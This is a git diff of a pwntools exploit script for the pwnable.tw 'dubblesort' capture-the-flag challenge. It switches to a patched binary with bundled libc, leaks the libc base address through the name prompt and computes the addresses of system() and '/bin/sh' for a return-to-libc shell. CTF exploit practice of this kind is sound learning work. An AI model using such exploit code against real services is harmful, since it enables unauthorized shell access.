@@ -4,7 +4,9 @@ from pwn import *
 #context.log_level = 'debug'
 context.terminal = ['tmux', 'split', '-h']
 
-elf = ELF('./dubblesort')
+elf = ELF('./dubblesort_patched')
+libc = ELF('./libc_32.so.6')
+ld = ELF('./ld-2.23.so')
 
 context.binary = elf
 
@@ -27,18 +29,14 @@ ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)
 local = 0
 if local:
     p = process([elf.path])
-    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 else:
     p = remote('chall.pwnable.tw', 10101)
-    libc = ELF('./libc_32.so.6')
 
 sa('What your name :', 'A' * 0x1c)
 ru('Hello ' + 'A' * 0x1c)
-if local:
-    libc_base = uu32(r(4)) - 0x184be
-else:
-    libc_base = uu32(r(4)) - 0x1ae244
+libc_base = uu32(r(4)) - 0x1ae244
 info('libc_base = ' + hex(libc_base))
+#gdb.attach(p)
 system = libc_base + libc.sym['system']
 info('system = ' + hex(system))
 binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
